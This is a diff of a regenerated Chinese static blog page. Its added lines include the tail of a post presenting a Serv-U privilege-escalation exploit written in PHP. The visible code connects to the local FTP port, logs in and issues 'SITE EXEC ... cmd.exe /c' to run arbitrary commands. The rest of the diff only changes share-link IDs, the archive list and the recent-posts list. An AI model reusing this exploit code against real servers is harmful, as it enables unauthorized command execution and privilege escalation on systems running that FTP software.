+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;fgets&nbsp;($fp,128);</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">}</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">}</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">//执行命令主函数定义</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">function&nbsp;ftpcmd($ftpport,$user,$password,$dir,$cmd){</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">$conn_id&nbsp;=&nbsp;fsockopen&nbsp;("127.0.0.1",&nbsp;$ftpport,&nbsp;$errno,&nbsp;$errstr,&nbsp;8);</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">if&nbsp;(!$conn_id)&nbsp;{</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;"$errstr&nbsp;($errno)<br>\n";</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">}&nbsp;else&nbsp;{</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($conn_id,&nbsp;"USER&nbsp;".$user."");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep&nbsp;(1);</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($conn_id,&nbsp;"PASS&nbsp;".$password."");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep&nbsp;(1);</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($conn_id,&nbsp;"SITE&nbsp;EXEC&nbsp;".$dir."cmd.exe&nbsp;/c&nbsp;".$cmd."");</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fputs&nbsp;($conn_id,&nbsp;"QUIT");</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep&nbsp;(1);</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(!feof($conn_id))&nbsp;{</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;fgets&nbsp;($conn_id,128);</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose($conn_id);</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">}</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">}</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">//去除转义字符</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">function&nbsp;stripslashes_array(&$array)&nbsp;{</span>&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="string">while&nbsp;(list($key,$var)&nbsp;=&nbsp;each($array))&nbsp;{</span>&nbsp;</span>
+    </li>
+    <li class="">
+      <span><span class="string">if&nbsp;($key&nbsp;!=&nbsp;&#8216;</span><span>argc</span><span class="string">&#8216;&nbsp;&&&nbsp;$key&nbsp;!=&nbsp;&#8216;</span><span>argv</span><span class="string">&#8216;&nbsp;&&&nbsp;(strtoupper($key)&nbsp;!=&nbsp;$key&nbsp;||&nbsp;&#8216;</span><span>&#8216;.</span><span class="func">intval</span><span>(</span><span class="vars">$key</span><span>)&nbsp;==&nbsp;"</span><span class="vars">$key</span><span>"))&nbsp;{&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span><span>&nbsp;(</span><span class="func">is_string</span><span>(</span><span class="vars">$var</span><span>))&nbsp;{&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="vars">$array</span><span>[</span><span class="vars">$key</span><span>]&nbsp;=&nbsp;</span><span class="func">stripslashes</span><span>(</span><span class="vars">$var</span><span>);&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span>
+    </li>
+    <li class="">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span><span>&nbsp;(</span><span class="func">is_array</span><span>(</span><span class="vars">$var</span><span>))&nbsp;{&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="alt">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="vars">$array</span><span>[</span><span class="vars">$key</span><span>]&nbsp;=&nbsp;stripslashes_array(</span><span class="vars">$var</span><span>);&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>}&nbsp;&nbsp;</span>
+    </li>
+    <li class="">
+      <span>}&nbsp;&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span><span class="keyword">return</span><span>&nbsp;</span><span class="vars">$array</span><span>;&nbsp;&nbsp;</span></span>
+    </li>
+    <li class="">
+      <span>}&nbsp;&nbsp;</span>
+    </li>
+    <li class="alt">
+      <span>?>&nbsp;&nbsp;</span>
+    </li>
+  </ol>
+</div>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://b.eaxi.com/posts/20080116-178.html" data-id="cl74krpq400bbatoj5aoyboeo" data-title="Serv-U All Version本地提升权限Exp10it Ver 1.5" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-posts-2008-01-16-179-html" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/posts/20080116-179.html" class="article-date">
@@ -156,7 +862,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://b.eaxi.com/posts/20080116-179.html" data-id="cl74ijgt200bfasothyyc181u" data-title="PHP的改进型urlencode，全部编码包括英文字符" class="article-share-link">分享</a>
+      <a data-url="https://b.eaxi.com/posts/20080116-179.html" data-id="cl74krpq400bfatoj9p2icv2u" data-title="PHP的改进型urlencode，全部编码包括英文字符" class="article-share-link">分享</a>
       
       
       
@@ -307,7 +1013,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://b.eaxi.com/posts/20080116-180.html" data-id="cl74ijgt300biasot67uqbxux" data-title="国外的PHP程序员面试题目一解" class="article-share-link">分享</a>
+      <a data-url="https://b.eaxi.com/posts/20080116-180.html" data-id="cl74krpq500bhatoj3x901ty1" data-title="国外的PHP程序员面试题目一解" class="article-share-link">分享</a>
       
       
       
@@ -374,7 +1080,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://b.eaxi.com/posts/20080102-168.html" data-id="cl74ijgsq00aiasot6depenf9" data-title="JSA在线压缩工具" class="article-share-link">分享</a>
+      <a data-url="https://b.eaxi.com/posts/20080102-168.html" data-id="cl74krppv00afatoj0v6m36p3" data-title="JSA在线压缩工具" class="article-share-link">分享</a>
       
       
       
@@ -426,7 +1132,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://b.eaxi.com/posts/20071222-167.html" data-id="cl74ijgsp00agasot2cp28sob" data-title="如何开始创业(转)" class="article-share-link">分享</a>
+      <a data-url="https://b.eaxi.com/posts/20071222-167.html" data-id="cl74krppv00adatoj29o280hj" data-title="如何开始创业(转)" class="article-share-link">分享</a>
       
       
       
@@ -483,7 +1189,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://b.eaxi.com/posts/20071217-166.html" data-id="cl74ijgsp00aeasotb8cn9k3s" data-title="18+成人寓言，流氓的泡妞哲学" class="article-share-link">分享</a>
+      <a data-url="https://b.eaxi.com/posts/20071217-166.html" data-id="cl74krppu00abatojgili4qiw" data-title="18+成人寓言，流氓的泡妞哲学" class="article-share-link">分享</a>
       
       
       
@@ -530,7 +1236,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://b.eaxi.com/posts/20071205-165.html" data-id="cl74ijgsn00aaasot72boe6zf" data-title="中国惠普前总裁孙振耀谈工作与生活" class="article-share-link">分享</a>
+      <a data-url="https://b.eaxi.com/posts/20071205-165.html" data-id="cl74krppt00a9atoj9g2d9clc" data-title="中国惠普前总裁孙振耀谈工作与生活" class="article-share-link">分享</a>
       
       
       
@@ -577,7 +1283,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://b.eaxi.com/posts/20070822-160.html" data-id="cl74ijgsm00a8asotaeswg1sa" data-title="个性化你的Apache" class="article-share-link">分享</a>
+      <a data-url="https://b.eaxi.com/posts/20070822-160.html" data-id="cl74krpq100azatoj3b5xhlie" data-title="个性化你的Apache" class="article-share-link">分享</a>
       
       
       
@@ -640,7 +1346,7 @@ SEO是专门研究各大搜索引擎排名的技术，是数百种低成本网�
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://b.eaxi.com/posts/20070821-159.html" data-id="cl74ijgsm00a6asotecmpa9qi" data-title="王通和admin5的SEO讲课内容" class="article-share-link">分享</a>
+      <a data-url="https://b.eaxi.com/posts/20070821-159.html" data-id="cl74krppt00a7atoj0sebgsd1" data-title="王通和admin5的SEO讲课内容" class="article-share-link">分享</a>
       
       
       
@@ -687,54 +1393,7 @@ SEO是专门研究各大搜索引擎排名的技术，是数百种低成本网�
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://b.eaxi.com/posts/20070820-158.html" data-id="cl74ijgsl00a3asotfwte4riq" data-title="搞笑的法律" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-posts-2007-08-19-157-html" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/posts/20070819-157.html" class="article-date">
-  <time class="dt-published" datetime="2007-08-18T16:00:00.000Z" itemprop="datePublished">2007-08-19</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96%E6%8A%80%E6%9C%AF/">其他技术</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/posts/20070819-157.html">如何关闭QQ空间？</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>从最开始因为好奇而开通 Qzone 到现在，我就没觉得那空间有什么优点，也许唯一的优点就是与 QQ 的紧密结合。还记得以前有要紧的事需要更新空间还得起个大早，赶着网速快才能打得开。现在的速度貌似改善了许多，但幼稚的风格、对高分辨率显示的不支持、多种代码的封闭，以及最可恶的就是腾讯一切向钱看的精神。</p>
-        
-          <p class="article-more-link">
-            <a href="/posts/20070819-157.html#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://b.eaxi.com/posts/20070819-157.html" data-id="cl74ijgsk00a0asot7vqrgutw" data-title="如何关闭QQ空间？" class="article-share-link">分享</a>
+      <a data-url="https://b.eaxi.com/posts/20070820-158.html" data-id="cl74krpps00a4atoj5p8o79ly" data-title="搞笑的法律" class="article-share-link">分享</a>
       
       
       
@@ -790,7 +1449,7 @@ SEO是专门研究各大搜索引擎排名的技术，是数百种低成本网�
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">三月 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">三月 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">十二月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/08/">八月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">七月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">六月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/05/">五月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">四月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">十二月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/11/">十一月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">七月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/04/">四月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/02/">二月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/01/">一月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/11/">十一月 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/10/">十月 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/09/">九月 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/06/">六月 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/03/">三月 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/12/">十二月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/11/">十一月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/10/">十月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/09/">九月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/08/">八月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/07/">七月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/06/">六月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/05/">五月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/01/">一月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/12/">十二月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/11/">十一月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/10/">十月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/08/">八月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/07/">七月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/06/">六月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/05/">五月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/04/">四月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/03/">三月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/02/">二月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/01/">一月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/12/">十二月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/08/">八月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/07/">七月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/06/">六月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/05/">五月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/04/">四月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/02/">二月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/01/">一月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/12/">十二月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/11/">十一月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/10/">十月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/09/">九月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/08/">八月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/07/">七月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/06/">六月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/05/">五月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/04/">四月 2006</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">三月 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">三月 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">十二月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/08/">八月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">七月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">六月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/05/">五月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">四月 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">十二月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/11/">十一月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">七月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/04/">四月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/02/">二月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/01/">一月 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/11/">十一月 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/10/">十月 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/09/">九月 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/06/">六月 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/03/">三月 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/12/">十二月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/11/">十一月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/10/">十月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/09/">九月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/08/">八月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/07/">七月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/06/">六月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/05/">五月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/01/">一月 2009</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/12/">十二月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/11/">十一月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/10/">十月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/08/">八月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/07/">七月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/06/">六月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/05/">五月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/04/">四月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/03/">三月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/02/">二月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2008/01/">一月 2008</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/12/">十二月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/08/">八月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/07/">七月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/06/">六月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/05/">五月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/04/">四月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/02/">二月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2007/01/">一月 2007</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/12/">十二月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/11/">十一月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/10/">十月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/09/">九月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/08/">八月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/07/">七月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/06/">六月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/05/">五月 2006</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2006/04/">四月 2006</a></li></ul>
     </div>
   </div>
 
@@ -801,6 +1460,10 @@ SEO是专门研究各大搜索引擎排名的技术，是数百种低成本网�
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2022/08/22/Dropbear-SSH-Public-Key-Authentication/">SSH Public Key Authentication</a>
+          </li>
         
           <li>
             <a href="/posts/20140328-625.html">avrdude: stk500_recv(): programmer is not responding</a>
@@ -816,10 +1479,6 @@ SEO是专门研究各大搜索引擎排名的技术，是数百种低成本网�
         
           <li>
             <a href="/posts/20120816-618.html">version `GLIBC_2.7&amp;#8242; not found</a>
-          </li>
-        
-          <li>
-            <a href="/posts/20120727-615.html">ClearSilver 64位机器上编译，test_crc错误的问题</a>
           </li>
         
       </ul>
